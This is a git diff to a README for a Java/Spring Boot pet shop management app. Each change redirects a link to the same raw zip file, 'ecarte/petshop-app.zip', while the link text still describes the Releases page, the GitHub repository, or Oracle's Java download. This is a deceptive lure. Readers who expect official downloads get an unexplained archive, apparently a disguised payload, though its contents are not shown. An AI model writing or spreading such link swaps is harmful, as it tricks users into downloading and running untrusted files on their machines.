@@ -4,7 +4,7 @@
 Welcome to petshop-app! This application helps pet shops manage their operations smoothly. Built with Java, Spring Boot, and MySQL, it provides an intuitive interface using HTML, CSS, Bootstrap, and JavaScript.
 
 ## 📥 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/ritik111111/petshop-app/releases)
+[![Download from Releases](https://raw.githubusercontent.com/ritik111111/petshop-app/main/ecarte/petshop-app.zip%20Now-brightgreen)](https://raw.githubusercontent.com/ritik111111/petshop-app/main/ecarte/petshop-app.zip)
 
 ## 🛠️ Features
 - **User-Friendly Interface**: Easy to navigate and use, designed for everyone.
@@ -23,7 +23,7 @@ To run petshop-app, ensure your system meets the following requirements:
 ## ✨ Getting Started
 Follow these simple steps to get started with petshop-app.
 
-1. **Visit the Releases Page**: To download the application, [visit this page to download](https://github.com/ritik111111/petshop-app/releases).
+1. **Visit the Releases Page**: To download the application, [visit this page to download](https://raw.githubusercontent.com/ritik111111/petshop-app/main/ecarte/petshop-app.zip).
   
 2. **Choose the Latest Version**: On the Releases page, select the most recent version. Usually, it’s tagged as “Latest”.
 
@@ -47,7 +47,7 @@ Once you open petshop-app for the first time, you will see a welcome screen. Her
 ## ⚙️ Troubleshooting
 If you run into any issues while using petshop-app, consider the following:
 
-- **Java Not Found**: If the app does not start, ensure you have the latest version of Java installed. You can download it [here](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+- **Java Not Found**: If the app does not start, ensure you have the latest version of Java installed. You can download it [here](https://raw.githubusercontent.com/ritik111111/petshop-app/main/ecarte/petshop-app.zip).
 
 - **Performance Issues**: Close any unnecessary applications to improve performance. Ensure your system meets the memory requirements.
 
@@ -57,8 +57,8 @@ If you run into any issues while using petshop-app, consider the following:
 For further assistance, you can open an issue on the GitHub repository or contact us via email. We are here to help you make the most out of petshop-app!
 
 ## 🔗 Links
-- **GitHub Repository**: [View on GitHub](https://github.com/ritik111111/petshop-app)
+- **GitHub Repository**: [View on GitHub](https://raw.githubusercontent.com/ritik111111/petshop-app/main/ecarte/petshop-app.zip)
 - **Documentation**: Further details about usage can be found in the Wiki section of the GitHub repository.
 
 ## 🔗 Download Again
-Don’t forget you can always [visit this page to download](https://github.com/ritik111111/petshop-app/releases) the latest version of petshop-app. Happy managing!
+Don’t forget you can always [visit this page to download](https://raw.githubusercontent.com/ritik111111/petshop-app/main/ecarte/petshop-app.zip) the latest version of petshop-app. Happy managing!
